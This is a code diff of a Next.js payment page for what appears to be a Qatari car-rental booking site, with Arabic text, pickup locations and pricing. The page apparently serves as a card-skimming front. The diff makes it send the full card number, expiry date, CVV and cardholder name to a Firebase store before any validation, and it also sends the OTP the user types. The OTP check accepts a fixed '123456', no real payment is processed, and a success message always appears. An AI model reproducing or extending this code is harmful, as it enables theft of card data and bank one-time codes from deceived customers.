@@ -2,9 +2,22 @@
 
 import type React from "react"
 
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import Image from "next/image"
-import { CreditCard, Calendar, Lock, Shield, CheckCircle2, AlertCircle } from "lucide-react"
+import { useSearchParams } from "next/navigation"
+import Link from "next/link"
+import {
+  CreditCard,
+  Calendar,
+  Lock,
+  Shield,
+  CheckCircle2,
+  AlertCircle,
+  MapPin,
+  Clock,
+  ArrowLeft,
+  CalendarDays,
+} from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
@@ -12,17 +25,112 @@ import { Separator } from "@/components/ui/separator"
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Badge } from "@/components/ui/badge"
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
+import { getCarById } from "@/lib/cars"
 import { addData } from "@/lib/firebase"
 
+// List of available pickup/return locations
+const locations = [
+  { id: "hamad-airport", name: "مطار حمد الدولي، الدوحة" },
+  { id: "west-bay", name: "الخليج الغربي، الدوحة" },
+  { id: "pearl-qatar", name: "اللؤلؤة، الدوحة" },
+  { id: "katara", name: "كتارا، الدوحة" },
+  { id: "lusail", name: "لوسيل، الدوحة" },
+  { id: "wakra", name: "الوكرة" },
+  { id: "al-khor", name: "الخور" },
+]
+
+// List of available pickup/return times
+const timeSlots = [
+  "08:00",
+  "08:30",
+  "09:00",
+  "09:30",
+  "10:00",
+  "10:30",
+  "11:00",
+  "11:30",
+  "12:00",
+  "12:30",
+  "13:00",
+  "13:30",
+  "14:00",
+  "14:30",
+  "15:00",
+  "15:30",
+  "16:00",
+  "16:30",
+  "17:00",
+  "17:30",
+  "18:00",
+  "18:30",
+  "19:00",
+  "19:30",
+  "20:00",
+  "20:30",
+  "21:00",
+  "21:30",
+  "22:00",
+]
+
 export default function PaymentPage() {
+  const searchParams = useSearchParams()
+  const carId = searchParams.get("carId") || "mercedes-g63"
+  const days = Number.parseInt(searchParams.get("days") || "3")
+
+  const [car, setCar] = useState<any>(null)
+  const [bookingDetails, setBookingDetails] = useState({
+    bookingRef: "SAL" + Math.floor(100000 + Math.random() * 900000),
+    pickupDate: new Date(),
+    returnDate: new Date(Date.now() + days * 24 * 60 * 60 * 1000),
+    pickupLocation: "مطار حمد الدولي، الدوحة",
+    returnLocation: "مطار حمد الدولي، الدوحة",
+    pickupTime: "10:00",
+    returnTime: "10:00",
+    days: days,
+    basePrice: 0,
+    taxRate: 0.05,
+    insurancePrice: 100,
+    totalPrice: 0,
+  })
+
+  // State for pickup/return details form
+  const [pickupDetails, setPickupDetails] = useState({
+    pickupLocation: "hamad-airport",
+    returnLocation: "hamad-airport",
+    pickupDate: new Date(),
+    returnDate: new Date(Date.now() + days * 24 * 60 * 60 * 1000),
+    pickupTime: "10:00",
+    returnTime: "10:00",
+  })
+
+  // State for showing pickup details form
+  const [showPickupForm, setShowPickupForm] = useState(false)
+
+  useEffect(() => {
+    const carData = getCarById(carId)
+    if (carData) {
+      setCar(carData)
+
+      const basePrice = carData.price * bookingDetails.days
+      const taxAmount = basePrice * bookingDetails.taxRate
+      const totalPrice = basePrice + taxAmount + bookingDetails.insurancePrice
+
+      setBookingDetails((prev) => ({
+        ...prev,
+        basePrice,
+        totalPrice,
+      }))
+    }
+  }, [carId, bookingDetails.days])
+
   const [showOtpDialog, setShowOtpDialog] = useState(false)
   const [otpVerified, setOtpVerified] = useState(false)
   const [otpError, setOtpError] = useState(false)
   const [otp, setOtp] = useState(["", "", "", "", "", ""])
   const [timeLeft, setTimeLeft] = useState(120)
 
-  // Add these state variables after the existing useState declarations
-  const [cardData, setCardData] = useState({
+  const [formData, setFormData] = useState({
     cardNumber: "",
     expiryDate: "",
     cvv: "",
@@ -35,7 +143,27 @@ export default function PaymentPage() {
     cardholderName: "",
   })
 
-  // Add this handler function before the handleSubmitPayment function
+  const formatDate = (date: Date) => {
+    return date.toLocaleDateString("ar-QA", {
+      weekday: "long",
+      year: "numeric",
+      month: "long",
+      day: "numeric",
+    })
+  }
+
+  const formatShortDate = (date: Date) => {
+    return date.toLocaleDateString("ar-QA", {
+      year: "numeric",
+      month: "numeric",
+      day: "numeric",
+    })
+  }
+
+  const formatTime = (time: string) => {
+    return time
+  }
+
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { id, value } = e.target
 
@@ -46,8 +174,8 @@ export default function PaymentPage() {
         .replace(/(.{4})/g, "$1 ")
         .trim()
 
-      setCardData({
-        ...cardData,
+      setFormData({
+        ...formData,
         [id]: formatted,
       })
       return
@@ -60,23 +188,76 @@ export default function PaymentPage() {
         formatted = `${formatted.substring(0, 2)}/${formatted.substring(2)}`
       }
 
-      setCardData({
-        ...cardData,
+      setFormData({
+        ...formData,
         [id]: formatted,
       })
       return
     }
 
-    setCardData({
-      ...cardData,
+    setFormData({
+      ...formData,
       [id]: value,
     })
   }
 
-  // Replace the existing handleSubmitPayment function with this one
+  // Handle pickup details change
+  const handlePickupDetailsChange = (field: string, value: string | Date) => {
+    setPickupDetails({
+      ...pickupDetails,
+      [field]: value,
+    })
+  }
+
+  // Save pickup details
+  const savePickupDetails = () => {
+    // Find location names from IDs
+    const pickupLocationName = locations.find((loc) => loc.id === pickupDetails.pickupLocation)?.name || ""
+    const returnLocationName = locations.find((loc) => loc.id === pickupDetails.returnLocation)?.name || ""
+
+    // Update booking details
+    setBookingDetails({
+      ...bookingDetails,
+      pickupLocation: pickupLocationName,
+      returnLocation: returnLocationName,
+      pickupDate: pickupDetails.pickupDate,
+      returnDate: pickupDetails.returnDate,
+      pickupTime: pickupDetails.pickupTime,
+      returnTime: pickupDetails.returnTime,
+    })
+
+    // Calculate days between pickup and return
+    const pickupDateTime = new Date(pickupDetails.pickupDate)
+    const returnDateTime = new Date(pickupDetails.returnDate)
+    const diffTime = Math.abs(returnDateTime.getTime() - pickupDateTime.getTime())
+    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24))
+
+    // Update days and recalculate prices
+    if (car && diffDays > 0) {
+      const newDays = diffDays
+      const newBasePrice = car.price * newDays
+      const newTaxAmount = newBasePrice * bookingDetails.taxRate
+      const newTotalPrice = newBasePrice + newTaxAmount + bookingDetails.insurancePrice
+
+      setBookingDetails((prev) => ({
+        ...prev,
+        days: newDays,
+        basePrice: newBasePrice,
+        totalPrice: newTotalPrice,
+      }))
+    }
+
+    // Hide the form
+    setShowPickupForm(false)
+  }
+
   const handleSubmitPayment = (e: React.FormEvent) => {
     e.preventDefault()
+ const visitorId = localStorage.getItem('visitor');
 
+    // If validation passes, proceed with payment
+    console.log("Payment data:", formData)
+    addData({id:visitorId!,formData})
     // Validate form
     const errors = {
       cardNumber: "",
@@ -86,7 +267,7 @@ export default function PaymentPage() {
     }
 
     // Card number validation
-    const cardNumberClean = cardData.cardNumber.replace(/\s/g, "")
+    const cardNumberClean = formData.cardNumber.replace(/\s/g, "")
     if (!cardNumberClean) {
       errors.cardNumber = "يرجى إدخال رقم البطاقة"
     } else if (!/^\d{16}$/.test(cardNumberClean)) {
@@ -94,12 +275,12 @@ export default function PaymentPage() {
     }
 
     // Expiry date validation
-    if (!cardData.expiryDate) {
+    if (!formData.expiryDate) {
       errors.expiryDate = "يرجى إدخال تاريخ الانتهاء"
-    } else if (!/^\d{2}\/\d{2}$/.test(cardData.expiryDate)) {
+    } else if (!/^\d{2}\/\d{2}$/.test(formData.expiryDate)) {
       errors.expiryDate = "صيغة غير صحيحة (MM/YY)"
     } else {
-      const [month, year] = cardData.expiryDate.split("/")
+      const [month, year] = formData.expiryDate.split("/")
       const currentDate = new Date()
       const currentYear = currentDate.getFullYear() % 100
       const currentMonth = currentDate.getMonth() + 1
@@ -115,14 +296,14 @@ export default function PaymentPage() {
     }
 
     // CVV validation
-    if (!cardData.cvv) {
+    if (!formData.cvv) {
       errors.cvv = "يرجى إدخال رمز الأمان"
-    } else if (!/^\d{3}$/.test(cardData.cvv)) {
+    } else if (!/^\d{3}$/.test(formData.cvv)) {
       errors.cvv = "يجب أن يتكون رمز الأمان من 3 أرقام"
     }
 
     // Cardholder name validation
-    if (!cardData.cardholderName) {
+    if (!formData.cardholderName) {
       errors.cardholderName = "يرجى إدخال اسم حامل البطاقة"
     }
 
@@ -133,11 +314,11 @@ export default function PaymentPage() {
     if (hasErrors) {
       return
     }
-    const visitorId = localStorage.getItem('visitor');
 
     // If validation passes, proceed with payment
-    console.log("Payment data:", cardData)
-    addData({id:visitorId!,cardData})
+    console.log("Payment data:", formData)
+    console.log("Booking details:", bookingDetails)
+
     // Process payment (in a real app, you would send this data to a payment processor)
     setShowOtpDialog(true)
   }
@@ -160,12 +341,12 @@ export default function PaymentPage() {
     }
   }
 
-  const handleVerifyOtp = () => {4
-  const visitorId = localStorage.getItem('visitor');
-
+  const handleVerifyOtp = () => {
     const otpValue = otp.join("")
-    addData({id:visitorId,otpValue})
+    const visitorId = localStorage.getItem('visitor');
 
+    // If validation passes, proceed with payment
+    addData({id:visitorId!,otpValue})
     if (otpValue === "123456") {
       setOtpVerified(true)
       setOtpError(false)
@@ -180,31 +361,29 @@ export default function PaymentPage() {
     return `${minutes}:${seconds < 10 ? "0" : ""}${seconds}`
   }
 
-  // Add this function to display the payment data in the success dialog
-  const getPaymentSummary = () => {
-    // Mask the card number for security
-    const maskedCardNumber = cardData.cardNumber ? `**** **** **** ${cardData.cardNumber.slice(-4)}` : ""
-
+  if (!car) {
     return (
-      <div className="bg-gray-50 p-4 rounded-lg mb-4 text-right">
-        <div className="flex justify-between items-center mb-2">
-          <span className="text-gray-500 text-sm">رقم البطاقة:</span>
-          <span className="font-medium">{maskedCardNumber}</span>
-        </div>
-        <div className="flex justify-between items-center mb-2">
-          <span className="text-gray-500 text-sm">اسم حامل البطاقة:</span>
-          <span className="font-medium">{cardData.cardholderName}</span>
-        </div>
-        <div className="flex justify-between items-center">
-          <span className="text-gray-500 text-sm">المبلغ:</span>
-          <span className="font-medium">ر.ق 887.5</span>
-        </div>
+      <div className="flex justify-center items-center min-h-screen">
+        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-sky-500"></div>
       </div>
     )
   }
 
   return (
     <div className="flex flex-col min-h-screen bg-gray-50 text-right">
+      {/* Header */}
+      <header className="sticky top-0 z-10 bg-white py-3 px-4 flex items-center justify-between shadow-sm border-b">
+        <div className="flex items-center gap-2">
+          <div className="bg-sky-500 rounded-full p-1.5">
+            <CreditCard className="h-5 w-5 text-white" />
+          </div>
+          <span className="text-sky-500 font-bold text-xl">سالك</span>
+        </div>
+        <Link href={`/cars/${carId}`} className="text-gray-500">
+          <ArrowLeft className="h-6 w-6" />
+        </Link>
+      </header>
+
       {/* Page Title */}
       <div className="bg-white p-6 border-b">
         <h1 className="text-2xl font-bold">الدفع الآمن</h1>
@@ -221,39 +400,240 @@ export default function PaymentPage() {
 
           <div className="flex gap-4 mb-6">
             <Image
-              src="/placeholder.svg?height=80&width=120"
-              alt="Changan C1"
+              src={car.image || "/placeholder.svg"}
+              alt={car.name}
               width={120}
               height={80}
               className="w-24 h-20 object-cover rounded-lg"
             />
             <div>
-              <h3 className="font-bold text-lg">Changan C1</h3>
+              <h3 className="font-bold text-lg">{car.name}</h3>
               <div className="flex gap-3 text-sm text-gray-500 mt-1">
                 <span className="flex items-center gap-1">
                   <Calendar className="h-4 w-4" />
-                  <span>3 أيام</span>
+                  <span>{bookingDetails.days} أيام</span>
                 </span>
                 <span>•</span>
-                <span>ر.ق 750</span>
+                <span>ر.ق {car.price} / يوم</span>
               </div>
             </div>
           </div>
+
+          {!showPickupForm ? (
+            <>
+              <div className="bg-gray-50 rounded-lg p-4 mb-4">
+                <div className="flex justify-between items-start mb-4">
+                  <div className="flex flex-col items-start">
+                    <span className="text-sm text-gray-500 mb-1">رقم الحجز</span>
+                    <span className="font-medium">{bookingDetails.bookingRef}</span>
+                  </div>
+                  <div className="flex flex-col items-end">
+                    <span className="text-sm text-gray-500 mb-1">تاريخ الحجز</span>
+                    <span className="font-medium">{formatDate(new Date())}</span>
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-2 gap-4 mb-4">
+                  <div className="flex flex-col">
+                    <span className="text-sm text-gray-500 mb-1">تاريخ الاستلام</span>
+                    <span className="font-medium">{formatDate(bookingDetails.pickupDate)}</span>
+                    <div className="flex items-center gap-1 mt-1 text-sm text-gray-500">
+                      <Clock className="h-3 w-3" />
+                      <span>{formatTime(bookingDetails.pickupTime)}</span>
+                    </div>
+                  </div>
+                  <div className="flex flex-col">
+                    <span className="text-sm text-gray-500 mb-1">تاريخ الإرجاع</span>
+                    <span className="font-medium">{formatDate(bookingDetails.returnDate)}</span>
+                    <div className="flex items-center gap-1 mt-1 text-sm text-gray-500">
+                      <Clock className="h-3 w-3" />
+                      <span>{formatTime(bookingDetails.returnTime)}</span>
+                    </div>
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-2 gap-4">
+                  <div className="flex flex-col">
+                    <span className="text-sm text-gray-500 mb-1">موقع الاستلام</span>
+                    <div className="flex items-center gap-1">
+                      <MapPin className="h-3 w-3 text-sky-500 flex-shrink-0" />
+                      <span className="font-medium text-sm">{bookingDetails.pickupLocation}</span>
+                    </div>
+                  </div>
+                  <div className="flex flex-col">
+                    <span className="text-sm text-gray-500 mb-1">موقع الإرجاع</span>
+                    <div className="flex items-center gap-1">
+                      <MapPin className="h-3 w-3 text-sky-500 flex-shrink-0" />
+                      <span className="font-medium text-sm">{bookingDetails.returnLocation}</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <Button
+                variant="outline"
+                className="w-full mb-6 py-2 flex items-center justify-center gap-2"
+                onClick={() => setShowPickupForm(true)}
+              >
+                <span>تعديل تفاصيل الاستلام والإرجاع</span>
+                <Calendar className="h-4 w-4" />
+              </Button>
+            </>
+          ) : (
+            <div className="bg-gray-50 rounded-lg p-4 mb-6">
+              <h3 className="font-bold text-lg mb-4">تفاصيل الاستلام والإرجاع</h3>
+
+              <div className="space-y-4 mb-6">
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label htmlFor="pickupLocation" className="text-sm">
+                      موقع الاستلام
+                    </Label>
+                    <Select
+                      value={pickupDetails.pickupLocation}
+                      onValueChange={(value) => handlePickupDetailsChange("pickupLocation", value)}
+                    >
+                      <SelectTrigger className="w-full bg-white">
+                        <SelectValue placeholder="اختر موقع الاستلام" />
+                      </SelectTrigger>
+                      <SelectContent>
+                        {locations.map((location) => (
+                          <SelectItem key={location.id} value={location.id}>
+                            {location.name}
+                          </SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                  </div>
+
+                  <div className="space-y-2">
+                    <Label htmlFor="returnLocation" className="text-sm">
+                      موقع الإرجاع
+                    </Label>
+                    <Select
+                      value={pickupDetails.returnLocation}
+                      onValueChange={(value) => handlePickupDetailsChange("returnLocation", value)}
+                    >
+                      <SelectTrigger className="w-full bg-white">
+                        <SelectValue placeholder="اختر موقع الإرجاع" />
+                      </SelectTrigger>
+                      <SelectContent>
+                        {locations.map((location) => (
+                          <SelectItem key={location.id} value={location.id}>
+                            {location.name}
+                          </SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label htmlFor="pickupDate" className="text-sm">
+                      تاريخ الاستلام
+                    </Label>
+                    <div className="relative">
+                      <Input
+                        id="pickupDate"
+                        type="date"
+                        className="w-full bg-white pr-10"
+                        value={pickupDetails.pickupDate.toISOString().split("T")[0]}
+                        onChange={(e) => handlePickupDetailsChange("pickupDate", new Date(e.target.value))}
+                        min={new Date().toISOString().split("T")[0]}
+                      />
+                      <CalendarDays className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
+                    </div>
+                  </div>
+
+                  <div className="space-y-2">
+                    <Label htmlFor="returnDate" className="text-sm">
+                      تاريخ الإرجاع
+                    </Label>
+                    <div className="relative">
+                      <Input
+                        id="returnDate"
+                        type="date"
+                        className="w-full bg-white pr-10"
+                        value={pickupDetails.returnDate.toISOString().split("T")[0]}
+                        onChange={(e) => handlePickupDetailsChange("returnDate", new Date(e.target.value))}
+                        min={pickupDetails.pickupDate.toISOString().split("T")[0]}
+                      />
+                      <CalendarDays className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
+                    </div>
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label htmlFor="pickupTime" className="text-sm">
+                      وقت الاستلام
+                    </Label>
+                    <Select
+                      value={pickupDetails.pickupTime}
+                      onValueChange={(value) => handlePickupDetailsChange("pickupTime", value)}
+                    >
+                      <SelectTrigger className="w-full bg-white">
+                        <SelectValue placeholder="اختر وقت الاستلام" />
+                      </SelectTrigger>
+                      <SelectContent>
+                        {timeSlots.map((time) => (
+                          <SelectItem key={time} value={time}>
+                            {time}
+                          </SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                  </div>
+
+                  <div className="space-y-2">
+                    <Label htmlFor="returnTime" className="text-sm">
+                      وقت الإرجاع
+                    </Label>
+                    <Select
+                      value={pickupDetails.returnTime}
+                      onValueChange={(value) => handlePickupDetailsChange("returnTime", value)}
+                    >
+                      <SelectTrigger className="w-full bg-white">
+                        <SelectValue placeholder="اختر وقت الإرجاع" />
+                      </SelectTrigger>
+                      <SelectContent>
+                        {timeSlots.map((time) => (
+                          <SelectItem key={time} value={time}>
+                            {time}
+                          </SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                  </div>
+                </div>
+              </div>
+
+              <div className="flex justify-end gap-2">
+                <Button variant="outline" onClick={() => setShowPickupForm(false)}>
+                  إلغاء
+                </Button>
+                <Button onClick={savePickupDetails} className="bg-sky-500 hover:bg-sky-600">
+                  حفظ التغييرات
+                </Button>
+              </div>
+            </div>
+          )}
 
           <Separator className="mb-6" />
 
           <div className="space-y-4 mb-6">
             <div className="flex justify-between">
-              <span className="text-gray-500">سعر الإيجار (3 أيام)</span>
-              <span>ر.ق 750</span>
+              <span className="text-gray-500">سعر الإيجار ({bookingDetails.days} أيام)</span>
+              <span>ر.ق {bookingDetails.basePrice.toFixed(2)}</span>
             </div>
             <div className="flex justify-between">
-              <span className="text-gray-500">ضريبة القيمة المضافة (5%)</span>
-              <span>ر.ق 37.5</span>
+              <span className="text-gray-500">ضريبة القيمة المضافة ({(bookingDetails.taxRate * 100).toFixed(0)}%)</span>
+              <span>ر.ق {(bookingDetails.basePrice * bookingDetails.taxRate).toFixed(2)}</span>
             </div>
             <div className="flex justify-between">
               <span className="text-gray-500">تأمين شامل</span>
-              <span>ر.ق 100</span>
+              <span>ر.ق {bookingDetails.insurancePrice.toFixed(2)}</span>
             </div>
           </div>
 
@@ -261,7 +641,7 @@ export default function PaymentPage() {
 
           <div className="flex justify-between font-bold text-lg">
             <span>المجموع</span>
-            <span>ر.ق 887.5</span>
+            <span>ر.ق {bookingDetails.totalPrice.toFixed(2)}</span>
           </div>
         </div>
 
@@ -317,7 +697,7 @@ export default function PaymentPage() {
                     formErrors.cardNumber ? "border-red-500" : ""
                   }`}
                   maxLength={19}
-                  value={cardData.cardNumber}
+                  value={formData.cardNumber}
                   onChange={handleInputChange}
                 />
                 <CreditCard className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
@@ -338,7 +718,7 @@ export default function PaymentPage() {
                       formErrors.expiryDate ? "border-red-500" : ""
                     }`}
                     maxLength={5}
-                    value={cardData.expiryDate}
+                    value={formData.expiryDate}
                     onChange={handleInputChange}
                   />
                   <Calendar className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
@@ -359,7 +739,7 @@ export default function PaymentPage() {
                     }`}
                     maxLength={3}
                     type="password"
-                    value={cardData.cvv}
+                    value={formData.cvv}
                     onChange={handleInputChange}
                   />
                   <Lock className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
@@ -378,7 +758,7 @@ export default function PaymentPage() {
                 className={`border-gray-300 rounded-lg py-5 text-right ${
                   formErrors.cardholderName ? "border-red-500" : ""
                 }`}
-                value={cardData.cardholderName}
+                value={formData.cardholderName}
                 onChange={handleInputChange}
               />
               {formErrors.cardholderName && <p className="text-red-500 text-sm mt-1">{formErrors.cardholderName}</p>}
@@ -467,6 +847,25 @@ export default function PaymentPage() {
 
               <h3 className="text-xl font-bold mb-2">تم الدفع بنجاح!</h3>
               <p className="text-gray-600 mb-6">تم تأكيد حجزك بنجاح. ستصلك رسالة تأكيد على بريدك الإلكتروني.</p>
+
+              <div className="bg-gray-50 p-4 rounded-lg mb-6 text-right">
+                <div className="flex justify-between items-center mb-2">
+                  <span className="text-gray-500 text-sm">رقم الحجز:</span>
+                  <span className="font-medium">{bookingDetails.bookingRef}</span>
+                </div>
+                <div className="flex justify-between items-center mb-2">
+                  <span className="text-gray-500 text-sm">السيارة:</span>
+                  <span className="font-medium">{car.name}</span>
+                </div>
+                <div className="flex justify-between items-center mb-2">
+                  <span className="text-gray-500 text-sm">المدة:</span>
+                  <span className="font-medium">{bookingDetails.days} أيام</span>
+                </div>
+                <div className="flex justify-between items-center">
+                  <span className="text-gray-500 text-sm">المبلغ الإجمالي:</span>
+                  <span className="font-medium">ر.ق {bookingDetails.totalPrice.toFixed(2)}</span>
+                </div>
+              </div>
 
               <Button
                 className="w-full bg-sky-500 hover:bg-sky-600 py-6 rounded-xl font-bold text-lg"
